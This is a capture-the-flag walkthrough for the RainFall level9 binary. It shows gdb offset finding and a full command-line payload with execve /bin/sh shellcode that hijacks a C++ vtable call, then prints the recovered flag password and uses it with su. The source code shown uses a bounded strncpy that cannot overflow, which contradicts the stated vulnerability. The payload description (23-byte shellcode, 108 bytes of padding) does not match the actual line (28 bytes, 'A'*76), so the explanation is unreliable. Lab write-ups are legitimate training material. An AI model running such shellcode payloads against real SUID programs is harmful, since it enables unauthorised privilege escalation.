# RainFall: Level9 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level9@${RAINFALL_IP} -p 4242
```

This binary is SUID-owned by `bonus0`. It contains a buffer overflow vulnerability in a virtual method, which allows overwriting a vtable pointer and hijacking control flow.

---

## Step 2: Source Code Summary

```cpp
#include <iostream>
#include <cstring>
#include <cstdlib>

class N {
public:
    N(int value) : id(value) {}

    virtual void doSomething(N* target) {
        std::cout << "Base class called with: " << id << " and target: " << target->id << std::endl;
    }

    void setAnnotation(const char* s) {
        std::strncpy(buffer, s, sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';
    }

    int operator+(const N& other) const { return this->id + other.id; }
    int operator-(const N& other) const { return this->id - other.id; }

protected:
    char buffer[100];
    int id;
};

int main(int argc, char** argv) {
    if (argc < 2)
        exit(1);

    N* a = new N(5);
    N* b = new N(6);

    a->setAnnotation(argv[1]);
    b->doSomething(a);

    return 0;
}
```

* The vulnerability is in `setAnnotation` which performs `strncpy` into a 100-byte buffer.
* The call to `b->doSomething(a)` is a virtual call, allowing control flow hijack if the vtable pointer is overwritten.

---

## Step 3: Determine Buffer Offset

Use a cyclic pattern to identify offset:

```gdb
gdb) run Aa0Aa1Aa2Aa3...Ag5Ag
Program received signal SIGSEGV
0x08048682 in main ()
gdb) x $eax
0x41366441 => shows offset overflow
```

Identified offset to be **108 bytes**.

---

## Step 4: Shellcode Payload Construction

We determine the location of the `buffer` in memory:

```gdb
gdb) disas main
...
gdb) b *main+136
(gdb) run AAAA
gdb) x $eax
0x804a00c => buffer address
```

Payload:
   
```bash
payload = 4 bytes of shellcode address (0x0804a010)
        + shellcode (23 bytes)
        + padding of 108 bytes
        + return address (0x0804a00c)
```

Final exploit:

```bash
./level9 $(python -c "print ('\x10\xa0\x04\x08' + \
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*76 + '\x0c\xa0\x04\x08')")
```

---

## Step 5: Get the Flag

```bash
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

---

## Step 6: Move to Bonus00

```bash
level9@RainFall:~$ su bonus0
Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

